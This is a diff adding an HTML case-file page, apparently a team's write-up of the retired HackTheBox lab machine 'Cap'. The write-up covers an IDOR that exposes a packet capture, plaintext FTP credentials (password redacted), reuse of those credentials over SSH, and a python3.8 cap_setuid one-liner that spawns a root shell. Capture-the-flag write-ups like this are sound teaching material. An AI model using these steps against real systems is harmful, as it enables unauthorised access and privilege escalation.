@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Case File — Cap</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Special+Elite&family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="case-file.css">
+<style>
+  .flag-redacted{
+    display:inline-block; vertical-align:middle;
+    height:15px; width:230px; max-width:60vw;
+    background: repeating-linear-gradient(90deg, var(--ink) 0 60%, transparent 0 100%);
+    background-color: var(--paper); background-size:14px 100%;
+    border-radius:2px; opacity:0.92;
+  }
+  .flag-row{display:flex;align-items:center;gap:10px;margin:10px 0;font-family:'IBM Plex Mono',monospace;font-size:0.85rem;}
+  .flag-label{color:var(--brass);text-transform:uppercase;letter-spacing:0.05em;font-size:0.72rem;min-width:64px;}
+</style>
+</head>
+<body>
+
+<nav>
+  <a href="../index.html" class="active">Dossier</a>
+  <a href="../case-files.html">Case Files</a>
+  <a href="../projects.html">Projects</a>
+  <a href="../blog.html">Blog</a>
+  <a href="../team.html">Team</a>
+  <a href="../contact.html">Contact</a>
+</nav> 
+
+<div class="topbar">
+  <a class="back" href="../case-files.html">&larr; Back to Case Files</a>
+  <span class="case-no">FILE NO. 2019-014</span>
+</div>
+
+<main>
+  <span class="file-tab">Easy · Linux</span>
+  <h1>Cap</h1>
+  <div class="subtitle">HackTheBox — Retired</div>
+  <div class="tags">
+    <span class="tag">IDOR</span>
+    <span class="tag">PCAP Credential Leak</span>
+    <span class="tag">Linux Capabilities Abuse</span>
+  </div>
+
+  <div class="chain">
+    <span class="node">IDOR on Scan ID</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">PCAP Credential Leak</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">Password Reuse</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">cap_setuid Abuse</span>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">01</span><h2>Reconnaissance</h2></div>
+    <pre><code>nmap -p- --min-rate 5000 &lt;TARGET_IP&gt;</code></pre>
+    <p>Found 3 open ports: FTP (21), SSH (22), HTTP (80).</p>
+    <div class="why"><strong>Why this mattered</strong>Three-port Linux boxes on HTB are almost always "the web app is the whole story" — worth going straight at the app rather than spending time on FTP/SSH banner-grabbing.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">02</span><h2>Web Enumeration &amp; IDOR</h2></div>
+    <p>Visited <code>http://&lt;TARGET_IP&gt;</code> — a Security Dashboard running on Gunicorn. Clicked <strong>Security Snapshot</strong>, which redirected to <code>/data/1</code>. Manually changed the ID to 0:</p>
+    <pre><code>http://&lt;TARGET_IP&gt;/data/0</code></pre>
+    <p>This is an <mark>IDOR vulnerability</mark> — the app doesn't verify ownership of the scan. Downloaded the pcap file from <code>/data/0</code>.</p>
+    <div class="why"><strong>Why this mattered</strong>The app trusted the client-supplied ID completely instead of checking whether the requesting session owned that scan record — the single most common IDOR pattern: sequential IDs plus no authorization check on read.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">03</span><h2>Credential Discovery</h2></div>
+    <p>Opened the pcap in Wireshark, followed the TCP Stream on the FTP traffic and found credentials in <mark>plaintext</mark>:</p>
+    <pre><code>USER nathan
+PASS &lt;redacted&gt;</code></pre>
+    <div class="why"><strong>Why this mattered</strong>Old, unencrypted protocols like plain FTP are still deployed in the wild, and a captured packet trace is one of the most direct ways credentials leak — no cracking required, just reading the stream.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">04</span><h2>User Flag</h2></div>
+    <p>SSH'd into the machine using the FTP credentials (<mark>password reuse</mark>):</p>
+    <pre><code>ssh nathan@&lt;TARGET_IP&gt;
+# password reused from FTP
+
+cat ~/user.txt</code></pre>
+    <div class="flag-row"><span class="flag-label">User Flag</span><span class="flag-redacted"></span></div>
+    <div class="why"><strong>Why this mattered</strong>Credential reuse across services is one of the most reliable lateral-movement assumptions to test on any box — a leaked credential for one protocol is very often valid for another.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">05</span><h2>Privilege Escalation</h2></div>
+    <p>Checked for binaries with special Linux capabilities:</p>
+    <pre><code>getcap -r / 2>/dev/null</code></pre>
+    <p>Found:</p>
+    <pre><code>/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip</code></pre>
+    <p><code>cap_setuid</code> allows Python to <mark class="rust">change its UID to root</mark> (0).</p>
+    <div class="why"><strong>Why this mattered</strong>Linux capabilities are a separate, more granular privilege model than the classic SUID bit, and they're easy to miss if enumeration only checks <code>find / -perm -4000</code>. <code>getcap -r /</code> is the equivalent sweep for capabilities and deserves to be a standard step, not an afterthought.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">06</span><h2>Root Flag</h2></div>
+    <p>Exploited the capability to spawn a root shell:</p>
+    <pre><code>python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+cat /root/root.txt</code></pre>
+    <div class="flag-row"><span class="flag-label">Root Flag</span><span class="flag-redacted"></span></div>
+  </div>
+</main>
+
+<footer>
+  <a href="mailto:burritosec51@gmail.com">burritosec51@gmail.com</a>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  hljs.configure({ languages: ["bash","shell","powershell","python","json","yaml","sql","xml","ini","javascript","php"] });
+  document.querySelectorAll("pre code").forEach((block) => { hljs.highlightElement(block); });
+</script>
+</body>
+</html>
